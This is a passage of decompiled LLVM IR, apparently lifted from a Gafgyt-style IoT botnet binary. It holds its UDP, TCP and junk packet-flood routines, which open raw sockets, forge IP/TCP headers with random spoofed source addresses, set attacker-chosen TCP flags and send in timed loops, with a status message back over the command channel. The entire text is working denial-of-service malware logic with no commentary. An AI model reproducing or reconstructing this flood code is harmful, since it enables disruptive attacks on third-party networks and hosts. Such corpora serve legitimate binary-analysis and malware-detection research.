  %v1_10005214 = urem i32 %v1_100051ec, 65536
  store i32 %v1_10005214, i32* @r3, align 4
  %v1_1000521c = call i32 @htons(i32 %v1_10005214)
  %sext = mul i32 %v1_1000521c, 65536
  %v1_10005220 = sdiv i32 %sext, 65536
  %v1_10005228 = trunc i32 %v1_10005220 to i16
  %v3_10005228 = add i32 %v1_100051a4, 24
  %v4_10005228 = inttoptr i32 %v3_10005228 to i16*
  store i16 %v1_10005228, i16* %v4_10005228, align 8
  %v0_1000522c = call i32 @rand_cmwc()
  %v1_1000523c = trunc i32 %v0_1000522c to i16
  store i16 %v1_1000523c, i16* %v5_100051c8, align 4
  br i1 %v3_10004edc, label %dec_label_pc_1000524c, label %dec_label_pc_10005260

dec_label_pc_1000524c:                            ; preds = %dec_label_pc_10005168
  %v0_1000524c = call i32 @rand_cmwc()
  %extract.t76 = trunc i32 %v0_1000524c to i16
  br label %dec_label_pc_10005278

dec_label_pc_10005260:                            ; preds = %dec_label_pc_10005168
  %v1_10005264 = urem i32 %arg2, 65536
  store i32 %v1_10005264, i32* @r3, align 4
  %v1_1000526c = call i32 @htons(i32 %v1_10005264)
  %extract.t = trunc i32 %v1_1000526c to i16
  br label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_1000524c, %dec_label_pc_10005260
  %storemerge71.off0 = phi i16 [ %extract.t, %dec_label_pc_10005260 ], [ %extract.t76, %dec_label_pc_1000524c ]
  %v1_10005350.pre-phi = phi i32 [ %v1_10005264, %dec_label_pc_10005260 ], [ 0, %dec_label_pc_1000524c ]
  %v3_10005280 = add i32 %v1_100051a4, 22
  %v4_10005280 = inttoptr i32 %v3_10005280 to i16*
  store i16 %storemerge71.off0, i16* %v4_10005280, align 2
  %v3_1000528c = add i32 %v1_100051a4, 26
  %v4_1000528c = inttoptr i32 %v3_1000528c to i16*
  store i16 0, i16* %v4_1000528c, align 2
  %v1_10005294 = add i32 %v1_100051a4, 28
  %v2_100052a0 = call i32 @makeRandomStr(i32 %v1_10005294, i32 %arg5)
  %v1_100052b0 = or i32 %v1_100051a4, 2
  %v2_100052b0 = inttoptr i32 %v1_100052b0 to i16*
  %v3_100052b0 = load i16, i16* %v2_100052b0, align 2
  %v4_100052b0 = zext i16 %v3_100052b0 to i32
  %v5_100052c0 = inttoptr i32 %v1_100051a4 to i16*
  %v6_100052c0 = call i32 @csum(i16* %v5_100052c0, i32 %v4_100052b0, i32 %v1_100051a4, i32 17, i32 %v1_100051ec)
  %sext4 = mul i32 %v6_100052c0, 65536
  %v1_100052c4 = sdiv i32 %sext4, 65536
  %v1_100052cc = trunc i32 %v1_100052c4 to i16
  %v3_100052cc = or i32 %v1_100051a4, 10
  %v4_100052cc = inttoptr i32 %v3_100052cc to i16*
  store i16 %v1_100052cc, i16* %v4_100052cc, align 2
  store i32 268456664, i32* @lr, align 4
  %v1_100052d4 = call i32 @__GI_time(i32 0)
  %v2_100052e0 = add i32 %v1_100052d4, %arg3
  %v3_10005380 = or i32 %v1_100051a4, 4
  %v4_10005380 = inttoptr i32 %v3_10005380 to i16*
  %v2_100053a0 = or i32 %v1_100051a4, 12
  %v3_100053a0 = inttoptr i32 %v2_100053a0 to i32*
  br label %dec_label_pc_100052f4

dec_label_pc_100052f4:                            ; preds = %dec_label_pc_100052f4.backedge, %dec_label_pc_10005278
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_10005278 ], [ %storemerge24, %dec_label_pc_100052f4.backedge ]
  store i32 268456728, i32* @lr, align 4
  %v7_10005314 = call i32 @__libc_sendto(i32 %v3_1000508c, i32 %v1_100051a4, i32 %v1_1000516c, i32 0, i32 %v2_10004f10, i32 16, i32 %v2_10004f10)
  %v0_10005318 = call i32 @rand_cmwc()
  %v1_10005328 = trunc i32 %v0_10005318 to i16
  store i16 %v1_10005328, i16* %v5_100051c8, align 4
  br i1 %v3_10004edc, label %dec_label_pc_10005338, label %dec_label_pc_1000534c

dec_label_pc_10005338:                            ; preds = %dec_label_pc_100052f4
  %v0_10005338 = call i32 @rand_cmwc()
  %extract.t78 = trunc i32 %v0_10005338 to i16
  br label %dec_label_pc_10005364

dec_label_pc_1000534c:                            ; preds = %dec_label_pc_100052f4
  store i32 %v1_10005350.pre-phi, i32* @r3, align 4
  %v1_10005358 = call i32 @htons(i32 %v1_10005350.pre-phi)
  %extract.t77 = trunc i32 %v1_10005358 to i16
  br label %dec_label_pc_10005364

dec_label_pc_10005364:                            ; preds = %dec_label_pc_10005338, %dec_label_pc_1000534c
  %storemerge73.off0 = phi i16 [ %extract.t77, %dec_label_pc_1000534c ], [ %extract.t78, %dec_label_pc_10005338 ]
  store i16 %storemerge73.off0, i16* %v4_10005280, align 2
  %v0_10005370 = call i32 @rand_cmwc()
  %v1_10005380 = trunc i32 %v0_10005370 to i16
  store i16 %v1_10005380, i16* %v4_10005380, align 4
  %v1_10005388 = call i32 @getRandomIP(i32 %storemerge10)
  store i32 %v1_10005388, i32* @r3, align 4
  %v1_10005394 = call i32 @htonl(i32 %v1_10005388)
  store i32 %v1_10005394, i32* %v3_100053a0, align 4
  %v3_100053b0 = load i16, i16* %v2_100052b0, align 2
  %v4_100053b0 = zext i16 %v3_100053b0 to i32
  %v6_100053c0 = call i32 @csum(i16* %v5_100052c0, i32 %v4_100053b0, i32 %v1_100051a4, i32 0, i32 %v2_10004f10)
  %v1_100053cc = trunc i32 %v6_100053c0 to i16
  store i16 %v1_100053cc, i16* %v4_100052cc, align 2
  %v4_100053d8 = icmp eq i32 %stack_var_-48.0, %arg6
  br i1 %v4_100053d8, label %dec_label_pc_100053e0, label %dec_label_pc_10005404

dec_label_pc_100053e0:                            ; preds = %dec_label_pc_10005364
  store i32 268456936, i32* @lr, align 4
  %v1_100053e4 = call i32 @__GI_time(i32 0)
  %v3_100053f0 = icmp sgt i32 %v1_100053e4, %v2_100052e0
  br i1 %v3_100053f0, label %dec_label_pc_10005414, label %dec_label_pc_100052f4.backedge

dec_label_pc_100052f4.backedge:                   ; preds = %dec_label_pc_100053e0, %dec_label_pc_10005404
  %storemerge24 = phi i32 [ %v1_10005408, %dec_label_pc_10005404 ], [ 0, %dec_label_pc_100053e0 ]
  br label %dec_label_pc_100052f4

dec_label_pc_10005404:                            ; preds = %dec_label_pc_10005364
  %v1_10005408 = add i32 %stack_var_-48.0, 1
  br label %dec_label_pc_100052f4.backedge

dec_label_pc_10005414:                            ; preds = %dec_label_pc_100053e0, %dec_label_pc_100050a8, %dec_label_pc_10005078
  %v0_1000543c28 = phi i32 [ %v5_100050c8, %dec_label_pc_100050a8 ], [ 0, %dec_label_pc_10005078 ], [ %v1_100053e4, %dec_label_pc_100053e0 ]
  br label %dec_label_pc_10005424

dec_label_pc_10005424:                            ; preds = %dec_label_pc_10005044, %dec_label_pc_10004f10, %dec_label_pc_10004f80, %dec_label_pc_10004f5c, %dec_label_pc_10005414
  %v0_1000543c = phi i32 [ %v4_10004f20, %dec_label_pc_10004f10 ], [ 0, %dec_label_pc_10004f80 ], [ 0, %dec_label_pc_10004f5c ], [ %v0_1000543c28, %dec_label_pc_10005414 ], [ %v1_10005048, %dec_label_pc_10005044 ]
  ret i32 %v0_1000543c

; uselistorder directives
  uselistorder i32 %v1_10005350.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10005264, { 2, 1, 0 }
  uselistorder i32 %v1_10005214, { 1, 0 }
  uselistorder i32 %v1_100051ec, { 1, 0, 2 }
  uselistorder i32 %v1_100051a4, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10004f10, { 4, 5, 3, 2, 0, 1 }
  uselistorder i32 %v1_10004efc, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10005424, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100052f4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10005364, { 1, 0 }
  uselistorder label %dec_label_pc_10005278, { 1, 0 }
  uselistorder label %dec_label_pc_10005168, { 1, 0 }
  uselistorder label %dec_label_pc_100050e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005044, { 1, 0 }
  uselistorder label %dec_label_pc_10004f10, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005440 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005440, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_10005490 = icmp eq i32 %arg2, 0
  br i1 %v3_10005490, label %dec_label_pc_10005498, label %dec_label_pc_100054ac

dec_label_pc_10005498:                            ; preds = %entry
  %v0_10005498 = call i32 @rand_cmwc()
  br label %dec_label_pc_100054c4

dec_label_pc_100054ac:                            ; preds = %entry
  %v1_100054b0 = urem i32 %arg2, 65536
  store i32 %v1_100054b0, i32* @r3, align 4
  %v1_100054b8 = call i32 @htons(i32 %v1_100054b0)
  br label %dec_label_pc_100054c4

dec_label_pc_100054c4:                            ; preds = %dec_label_pc_10005498, %dec_label_pc_100054ac
  %v2_100054c4 = ptrtoint i32* %stack_var_-92 to i32
  %v4_100054d4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_100054c4)
  %v3_100054dc = icmp eq i32 %v4_100054d4, 0
  br i1 %v3_100054dc, label %dec_label_pc_100054e8, label %dec_label_pc_10005a34

dec_label_pc_100054e8:                            ; preds = %dec_label_pc_100054c4
  store i32 268457232, i32* @lr, align 4
  %v3_1000550c = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000551c = icmp eq i32 %v3_1000550c, 0
  br i1 %v3_1000551c, label %dec_label_pc_10005a34, label %dec_label_pc_10005528

dec_label_pc_10005528:                            ; preds = %dec_label_pc_100054e8
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10005530 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268457292, i32* @lr, align 4
  %v5_10005548 = call i32 @__GI_setsockopt(i32 %v3_1000550c, i32 0, i32 3, i32 %v2_10005530, i32 4)
  %tmp59 = icmp sgt i32 %v5_10005548, -1
  br i1 %tmp59, label %dec_label_pc_1000555c, label %dec_label_pc_10005a34

dec_label_pc_1000555c:                            ; preds = %dec_label_pc_10005528
  %v3_10005560 = icmp eq i32 %arg4, 0
  br i1 %v3_10005560, label %dec_label_pc_1000558c, label %dec_label_pc_10005574

dec_label_pc_10005574:                            ; preds = %dec_label_pc_1000555c
  %v1_10005578 = sub i32 32, %arg4
  %v2_10005580 = urem i32 %v1_10005578, 64
  %v1_10005584 = shl i32 -1, %v2_10005580
  br label %dec_label_pc_1000558c

dec_label_pc_1000558c:                            ; preds = %dec_label_pc_1000555c, %dec_label_pc_10005574
  %storemerge9 = phi i32 [ %v1_10005584, %dec_label_pc_10005574 ], [ 0, %dec_label_pc_1000555c ]
  %v1_10005590 = add i32 %arg6, 40
  %v1_100055a0 = add i32 %arg6, 70
  %v1_100055a4 = and i32 %v1_100055a0, -16
  %v2_100055ac = load i32, i32* %stack_var_-128, align 4
  %v1_100055b4 = load i32, i32* @r1, align 4
  %v3_100055b4 = sub i32 %v1_100055b4, %v1_100055a4
  %v4_100055b4 = inttoptr i32 %v3_100055b4 to i32*
  store i32 %v2_100055ac, i32* %v4_100055b4, align 4
  %v1_100055c4 = add i32 %v3_100055b4, 23
  %v1_100055c8 = and i32 %v1_100055c4, -16
  %v1_100055e8 = add i32 %v1_100055c8, 20
  %v5_100055ec = inttoptr i32 %v1_100055e8 to i16*
  %v3_100055f0 = load i32, i32* %stack_var_-88, align 4
  %v1_100055f8 = call i32 @getRandomIP(i32 %storemerge9)
  store i32 %v1_100055f8, i32* @r3, align 4
  %v1_10005604 = call i32 @htonl(i32 %v1_100055f8)
  %v1_10005610 = add i32 %arg6, 20
  %v6_10005628 = inttoptr i32 %v1_100055c8 to i32*
  %v7_10005628 = call i32 @makeIPPacket(i32* %v6_10005628, i32 %v3_100055f0, i32 %v1_10005604, i32 6, i32 %v1_10005610, i32 %arg6)
  %v0_1000562c = call i32 @rand_cmwc()
  %v1_1000563c = trunc i32 %v0_1000562c to i16
  store i16 %v1_1000563c, i16* %v5_100055ec, align 4
  %v0_10005640 = call i32 @rand_cmwc()
  %v2_1000564c = add i32 %v1_100055c8, 24
  %v3_1000564c = inttoptr i32 %v2_1000564c to i32*
  store i32 %v0_10005640, i32* %v3_1000564c, align 8
  %v2_10005658 = add i32 %v1_100055c8, 28
  %v3_10005658 = inttoptr i32 %v2_10005658 to i32*
  store i32 0, i32* %v3_10005658, align 4
  %v1_10005660 = add i32 %v1_100055c8, 32
  %v2_10005660 = inttoptr i32 %v1_10005660 to i32*
  %v1_10005668 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000566c = add i32 %v1_100055c8, 32
  %v3_1000566c = inttoptr i32 %v2_1000566c to i32*
  store i32 %v1_10005668, i32* %v3_1000566c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2e0.86 to i32), i32* @r4, align 4
  %v4_10005680 = inttoptr i32 %arg5 to i8*
  %v5_10005680 = call i32 @__GI_strcoll(i8* %v4_10005680, i32 ptrtoint ([4 x i8]* @global_var_1000e2e0.86 to i32), i32 268500992)
  %v3_10005688 = icmp eq i32 %v5_10005680, 0
  br i1 %v3_10005688, label %dec_label_pc_10005690, label %dec_label_pc_100056e4

dec_label_pc_10005690:                            ; preds = %dec_label_pc_1000558c
  %v3_10005694 = load i32, i32* %v2_10005660, align 16
  %v1_100056d8 = or i32 %v3_10005694, 2031616
  store i32 %v1_100056d8, i32* %v2_10005660, align 16
  br label %dec_label_pc_1000584c

dec_label_pc_100056e4:                            ; preds = %dec_label_pc_1000558c
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268457720, i32* @lr, align 4
  %v3_100056f4 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_1000584418 = icmp eq i32 %v3_100056f4, 0
  br i1 %v3_1000584418, label %dec_label_pc_1000584c, label %dec_label_pc_10005704

dec_label_pc_10005704:                            ; preds = %dec_label_pc_100056e4, %dec_label_pc_10005828
  %storemerge1319 = phi i32 [ %v3_10005834, %dec_label_pc_10005828 ], [ %v3_100056f4, %dec_label_pc_100056e4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2e8.88 to i32), i32* @r4, align 4
  %v4_10005714 = inttoptr i32 %storemerge1319 to i8*
  %v5_10005714 = call i32 @__GI_strcoll(i8* %v4_10005714, i32 ptrtoint ([4 x i8]* @global_var_1000e2e8.88 to i32), i32 268500992)
  %v3_1000571c = icmp eq i32 %v5_10005714, 0
  br i1 %v3_1000571c, label %dec_label_pc_10005724, label %dec_label_pc_10005738

dec_label_pc_10005724:                            ; preds = %dec_label_pc_10005704
  %v3_10005728 = load i32, i32* %v2_10005660, align 16
  %v1_1000572c = or i32 %v3_10005728, 131072
  store i32 %v1_1000572c, i32* %v2_10005660, align 16
  br label %dec_label_pc_10005828

dec_label_pc_10005738:                            ; preds = %dec_label_pc_10005704
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2ec.89 to i32), i32* @r4, align 4
  %v5_10005748 = call i32 @__GI_strcoll(i8* %v4_10005714, i32 ptrtoint ([4 x i8]* @global_var_1000e2ec.89 to i32), i32 268500992)
  %v3_10005750 = icmp eq i32 %v5_10005748, 0
  br i1 %v3_10005750, label %dec_label_pc_10005758, label %dec_label_pc_1000576c

dec_label_pc_10005758:                            ; preds = %dec_label_pc_10005738
  %v3_1000575c = load i32, i32* %v2_10005660, align 16
  %v1_10005760 = or i32 %v3_1000575c, 262144
  store i32 %v1_10005760, i32* %v2_10005660, align 16
  br label %dec_label_pc_10005828

dec_label_pc_1000576c:                            ; preds = %dec_label_pc_10005738
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2f0.90 to i32), i32* @r4, align 4
  %v5_1000577c = call i32 @__GI_strcoll(i8* %v4_10005714, i32 ptrtoint ([4 x i8]* @global_var_1000e2f0.90 to i32), i32 268500992)
  %v3_10005784 = icmp eq i32 %v5_1000577c, 0
  br i1 %v3_10005784, label %dec_label_pc_1000578c, label %dec_label_pc_100057a0

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_1000576c
  %v3_10005790 = load i32, i32* %v2_10005660, align 16
  %v1_10005794 = or i32 %v3_10005790, 65536
  store i32 %v1_10005794, i32* %v2_10005660, align 16
  br label %dec_label_pc_10005828

dec_label_pc_100057a0:                            ; preds = %dec_label_pc_1000576c
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2f4.91 to i32), i32* @r4, align 4
  %v5_100057b0 = call i32 @__GI_strcoll(i8* %v4_10005714, i32 ptrtoint ([4 x i8]* @global_var_1000e2f4.91 to i32), i32 268500992)
  %v3_100057b8 = icmp eq i32 %v5_100057b0, 0
  br i1 %v3_100057b8, label %dec_label_pc_100057c0, label %dec_label_pc_100057d4

dec_label_pc_100057c0:                            ; preds = %dec_label_pc_100057a0
  %v3_100057c4 = load i32, i32* %v2_10005660, align 16
  %v1_100057c8 = or i32 %v3_100057c4, 1048576
  store i32 %v1_100057c8, i32* %v2_10005660, align 16
  br label %dec_label_pc_10005828

dec_label_pc_100057d4:                            ; preds = %dec_label_pc_100057a0
  store i32 ptrtoint ([4 x i8]* @global_var_1000e2f8.92 to i32), i32* @r4, align 4
  %v5_100057e4 = call i32 @__GI_strcoll(i8* %v4_10005714, i32 ptrtoint ([4 x i8]* @global_var_1000e2f8.92 to i32), i32 268500992)
  %v3_100057ec = icmp eq i32 %v5_100057e4, 0
  br i1 %v3_100057ec, label %dec_label_pc_100057f4, label %dec_label_pc_10005808

dec_label_pc_100057f4:                            ; preds = %dec_label_pc_100057d4
  %v3_100057f8 = load i32, i32* %v2_10005660, align 16
  %v1_100057fc = or i32 %v3_100057f8, 524288
  store i32 %v1_100057fc, i32* %v2_10005660, align 16
  br label %dec_label_pc_10005828

dec_label_pc_10005808:                            ; preds = %dec_label_pc_100057d4
  %v3_1000580c = load i32, i32* @global_var_1001fd98.37, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005828.94 to i32), i32* @lr, align 4
  %v5_10005824 = call i32 @sockprintf(i32 %v3_1000580c, i32 ptrtoint ([18 x i8]* @global_var_1000e2fc.93 to i32), i32 %storemerge1319)
  br label %dec_label_pc_10005828

dec_label_pc_10005828:                            ; preds = %dec_label_pc_100057f4, %dec_label_pc_100057c0, %dec_label_pc_1000578c, %dec_label_pc_10005758, %dec_label_pc_10005724, %dec_label_pc_10005808
  store i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32* @r4, align 4
  store i32 268458040, i32* @lr, align 4
  %v3_10005834 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1000e2e4.87 to i32), i32 268500992)
  %v3_10005844 = icmp eq i32 %v3_10005834, 0
  br i1 %v3_10005844, label %dec_label_pc_1000584c, label %dec_label_pc_10005704

dec_label_pc_1000584c:                            ; preds = %dec_label_pc_10005828, %dec_label_pc_100056e4, %dec_label_pc_10005690
  %v0_1000584c = call i32 @rand_cmwc()
  %v1_1000585c = trunc i32 %v0_1000584c to i16
  %v3_1000585c = add i32 %v1_100055c8, 34
  %v4_1000585c = inttoptr i32 %v3_1000585c to i16*
  store i16 %v1_1000585c, i16* %v4_1000585c, align 2
  %v3_10005868 = add i32 %v1_100055c8, 36
  %v4_10005868 = inttoptr i32 %v3_10005868 to i16*
  store i16 0, i16* %v4_10005868, align 4
  %v3_10005874 = add i32 %v1_100055c8, 38
  %v4_10005874 = inttoptr i32 %v3_10005874 to i16*
  store i16 0, i16* %v4_10005874, align 2
  br i1 %v3_10005490, label %dec_label_pc_10005884, label %dec_label_pc_10005898

dec_label_pc_10005884:                            ; preds = %dec_label_pc_1000584c
  %v0_10005884 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_10005884 to i16
  br label %dec_label_pc_100058b0

dec_label_pc_10005898:                            ; preds = %dec_label_pc_1000584c
  %v1_1000589c = urem i32 %arg2, 65536
  store i32 %v1_1000589c, i32* @r3, align 4
  %v1_100058a4 = call i32 @htons(i32 %v1_1000589c)
  %extract.t = trunc i32 %v1_100058a4 to i16
  br label %dec_label_pc_100058b0

dec_label_pc_100058b0:                            ; preds = %dec_label_pc_10005884, %dec_label_pc_10005898
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_10005898 ], [ %extract.t63, %dec_label_pc_10005884 ]
  %v3_100058b8 = add i32 %v1_100055c8, 22
  %v4_100058b8 = inttoptr i32 %v3_100058b8 to i16*
  store i16 %storemerge60.off0, i16* %v4_100058b8, align 2
  store i32 268458184, i32* @lr, align 4
  %v3_100058c4 = inttoptr i32 %v1_100055e8 to i32*
  %v4_100058c4 = call i32 @tcpcsum(i32 %v1_100055c8, i32* %v3_100058c4, i32 %v1_100055e8)
  %v1_100058d0 = trunc i32 %v4_100058c4 to i16
  store i16 %v1_100058d0, i16* %v4_10005868, align 4
  %v1_100058e0 = or i32 %v1_100055c8, 2
  %v2_100058e0 = inttoptr i32 %v1_100058e0 to i16*
  %v3_100058e0 = load i16, i16* %v2_100058e0, align 2
  %v4_100058e0 = zext i16 %v3_100058e0 to i32
  %v5_100058f0 = inttoptr i32 %v1_100055c8 to i16*
  %v6_100058f0 = call i32 @csum(i16* %v5_100058f0, i32 %v4_100058e0, i32 %v1_100055c8, i32 6, i32 %v1_10005610)
  %sext3 = mul i32 %v6_100058f0, 65536
  %v1_100058f4 = sdiv i32 %sext3, 65536
  %v1_100058fc = trunc i32 %v1_100058f4 to i16
  %v3_100058fc = or i32 %v1_100055c8, 10
  %v4_100058fc = inttoptr i32 %v3_100058fc to i16*
  store i16 %v1_100058fc, i16* %v4_100058fc, align 2
  store i32 268458248, i32* @lr, align 4
  %v1_10005904 = call i32 @__GI_time(i32 0)
  %v2_10005910 = add i32 %v1_10005904, %arg3
  %v2_10005964 = or i32 %v1_100055c8, 12
  %v3_10005964 = inttoptr i32 %v2_10005964 to i32*
  %v3_10005978 = or i32 %v1_100055c8, 4
  %v4_10005978 = inttoptr i32 %v3_10005978 to i16*
  br label %dec_label_pc_10005924

dec_label_pc_10005924:                            ; preds = %dec_label_pc_10005924.backedge, %dec_label_pc_100058b0
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_100058b0 ], [ %storemerge22, %dec_label_pc_10005924.backedge ]
  store i32 268458312, i32* @lr, align 4
  %v7_10005944 = call i32 @__libc_sendto(i32 %v3_1000550c, i32 %v1_100055c8, i32 %v1_10005590, i32 0, i32 %v2_100054c4, i32 16, i32 %v2_100054c4)
  %v1_1000594c = call i32 @getRandomIP(i32 %storemerge9)
  store i32 %v1_1000594c, i32* @r3, align 4
  %v1_10005958 = call i32 @htonl(i32 %v1_1000594c)
  store i32 %v1_10005958, i32* %v3_10005964, align 4
  %v0_10005968 = call i32 @rand_cmwc()
  %v1_10005978 = trunc i32 %v0_10005968 to i16
  store i16 %v1_10005978, i16* %v4_10005978, align 4
  %v0_1000597c = call i32 @rand_cmwc()
  store i32 %v0_1000597c, i32* %v3_1000564c, align 8
  %v0_1000598c = call i32 @rand_cmwc()
  %v1_1000599c = trunc i32 %v0_1000598c to i16
  store i16 %v1_1000599c, i16* %v5_100055ec, align 4
  store i16 0, i16* %v4_10005868, align 4
  store i32 268458424, i32* @lr, align 4
  %v4_100059b4 = call i32 @tcpcsum(i32 %v1_100055c8, i32* %v3_100058c4, i32 %v1_100055e8)
  %v1_100059c0 = trunc i32 %v4_100059b4 to i16
  store i16 %v1_100059c0, i16* %v4_10005868, align 4
  %v3_100059d0 = load i16, i16* %v2_100058e0, align 2
  %v4_100059d0 = zext i16 %v3_100059d0 to i32
  %v6_100059e0 = call i32 @csum(i16* %v5_100058f0, i32 %v4_100059d0, i32 %v1_100055c8, i32 0, i32 %v2_100054c4)
  %v1_100059ec = trunc i32 %v6_100059e0 to i16
  store i16 %v1_100059ec, i16* %v4_100058fc, align 2
  %v4_100059f8 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_100059f8, label %dec_label_pc_10005a00, label %dec_label_pc_10005a24

dec_label_pc_10005a00:                            ; preds = %dec_label_pc_10005924
  store i32 268458504, i32* @lr, align 4
  %v1_10005a04 = call i32 @__GI_time(i32 0)
  %v3_10005a10 = icmp sgt i32 %v1_10005a04, %v2_10005910
  br i1 %v3_10005a10, label %dec_label_pc_10005a34, label %dec_label_pc_10005924.backedge

dec_label_pc_10005924.backedge:                   ; preds = %dec_label_pc_10005a00, %dec_label_pc_10005a24
  %storemerge22 = phi i32 [ %v1_10005a28, %dec_label_pc_10005a24 ], [ 0, %dec_label_pc_10005a00 ]
  br label %dec_label_pc_10005924

dec_label_pc_10005a24:                            ; preds = %dec_label_pc_10005924
  %v1_10005a28 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_10005924.backedge

dec_label_pc_10005a34:                            ; preds = %dec_label_pc_10005a00, %dec_label_pc_10005528, %dec_label_pc_100054e8, %dec_label_pc_100054c4
  %v0_10005a5c = phi i32 [ %v5_10005548, %dec_label_pc_10005528 ], [ 0, %dec_label_pc_100054e8 ], [ %v4_100054d4, %dec_label_pc_100054c4 ], [ %v1_10005a04, %dec_label_pc_10005a00 ]
  ret i32 %v0_10005a5c

; uselistorder directives
  uselistorder i32 %v1_1000589c, { 1, 0 }
  uselistorder i32 %v3_10005834, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_10005660, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_10005610, { 1, 0 }
  uselistorder i32 %v1_100055e8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100055c8, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_100054c4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_100054b0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 18, 17, 16, 15, 14, 13, 12, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005924.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100058b0, { 1, 0 }
  uselistorder label %dec_label_pc_10005828, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10005704, { 1, 0 }
  uselistorder label %dec_label_pc_1000558c, { 1, 0 }
  uselistorder label %dec_label_pc_100054c4, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005a60 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005a60, i32* %stack_var_-240, align 4
  store i32 268458640, i32* @lr, align 4
  %v0_10005a8c = call i32 @getdtablesize()
  %v1_10005a94 = udiv i32 %v0_10005a8c, 2
  %v2_10005a94 = and i32 %v0_10005a8c, -2147483648
  %v3_10005a94 = or i32 %v1_10005a94, %v2_10005a94
  store i32 2, i32* %stack_var_-200, align 4
  %v1_10005aac = urem i32 %arg2, 65536
  store i32 %v1_10005aac, i32* @r3, align 4
  %v1_10005ab4 = call i32 @htons(i32 %v1_10005aac)
  %v2_10005ac0 = ptrtoint i32* %stack_var_-200 to i32
  %v4_10005ad0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-196, i32 %v2_10005ac0)
  %v3_10005ad8 = icmp eq i32 %v4_10005ad0, 0
  br i1 %v3_10005ad8, label %dec_label_pc_10005ae4, label %dec_label_pc_10005fa8

dec_label_pc_10005ae4:                            ; preds = %entry
  %v1_10005b00 = mul i32 %v1_10005a94, 8
  %v1_10005b08 = add i32 %v1_10005b00, 30
  %v1_10005b0c = and i32 %v1_10005b08, -16
  %v2_10005b14 = load i32, i32* %stack_var_-240, align 4
  %v1_10005b1c = load i32, i32* @r1, align 4
  %v3_10005b1c = sub i32 %v1_10005b1c, %v1_10005b0c
  %v4_10005b1c = inttoptr i32 %v3_10005b1c to i32*
  store i32 %v2_10005b14, i32* %v4_10005b1c, align 4
  %v1_10005b2c = add i32 %v3_10005b1c, 23
  %v1_10005b30 = and i32 %v1_10005b2c, -16
  %v1_10005b4c = mul i32 %v3_10005a94, 5
